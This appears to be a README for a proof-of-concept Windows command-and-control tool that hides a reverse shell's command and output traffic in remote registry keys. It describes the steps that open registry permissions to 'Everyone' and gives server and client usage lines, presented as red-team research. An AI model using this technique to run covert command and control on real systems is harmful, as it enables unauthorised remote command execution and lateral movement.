# Everything Is A Shell... An asyncrounous shell at least...

## Disclaimer
The shells are all Proof-of-Concept and have only been tested in my lab. They are made to test the if the shells actually work and nothing else. Enjoy :)

## Concept for this repository
This repository is made to explore more untraditional ways for establishing command and control (c2) on Microsoft Windows systems. The shells in this repository are asynchronous just like Cobalt Strikes shells: Asyncronous. This means that the client and server will not communicate at all times like a standard netcat/meterpreter shell. Instead, the client will check-in for any new commands from the server at a given interval (sleep timer). If a command is found, the client will execute it, and post the result back to the server. The checkin-interval is a sleep timer just like in Cobalt Strike. 

At this moment, the repository only has a C2 using Windows Registry keys, but I hope to add more in the future. 

## C2 using Windows registry keys

### Short description: 
This reverse shell is based on Windows Registry keys. Windows allows for specific users to read, write and/or delete registry keys on remote systems using the WinReg Protocol (MS-RRP), which is build on top of the RPC protocol: (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78). Using custom code, it is possible to create a client-server-relationsship by having certain registry keys located on the server that the client can interact with.  

**Requirements:** 
The Remote Registry Service needs to be enabled on the server, and the user trying to connect/read/write to the remote registry needs to have the correct permissions.

**Limitations:** 
Since the traffic is based on RPC, it should only be suitable for lateral movement on local networks, however I have not tested it over the internet. 

### How it works:
1. When the server starts, the Remote Registry Service is enabled and started. 
2. The registry key HKEY_LOCAL_MACHINE\Software\RegistryC2\<user-defined> is created along with the following registry values: cmd, output & sleep. 
3. Permissions are then set for the user "Everyone" on the newly created registry key.
4. Permissions are then likewise set on the key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg. This ensures that the client any client can authenticate to the server. (N.B. On exiting/closing of the server, these permissions are removed again.) 
5. The client will then check the C2 server for the value of "sleep" to determine how often to check it. 
6. The client then executes whatever command found in the "cmd"-value. 
7. The result of the command is written as a string to the C2's "output" value. 
8. While running, the server will look for new updates to the "output" value and prints it back to the attacker.

### Usage:
**Setup the server (listener):**
``` 
RegC2Server.exe <Unique Registry key name to use>
RegC2Server.exe victim01
```
**Client-side:**
```
RegC2Client.exe <host> <Registry key name used to start the server>
RegC2Client.exe ws01 victim01
```

**Since this is a POC, only the following commands have been implemented:**
```
>help
sleep <int>      Set the sleep time to the value of int
cmd <command>    cmd to execute
exit             Exit the application gracefully
```


### Screenshot:


Win32 apis 

Wireshark traffic

intro to shell, usage. 
